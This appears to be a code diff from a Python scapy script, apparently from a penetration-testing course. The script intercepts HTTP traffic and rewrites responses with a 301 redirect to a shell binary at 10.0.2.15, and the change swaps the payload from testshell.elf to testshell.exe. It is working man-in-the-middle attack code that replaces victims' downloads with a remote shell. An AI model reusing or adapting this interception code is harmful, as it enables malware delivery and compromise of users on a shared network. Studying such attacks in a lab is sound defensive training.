@@ -44,7 +44,7 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+} Replacing File")
                 # print(scapy_packet.show())
-                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/testshell.elf\n\n\n")
+                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/testshell.exe\n\n\n")
                 # same as dns spoofer we need to delete these fields and scapy will redo them for us to hide the fact they have been altered
 
                 packet.set_payload(str(modified_packet))
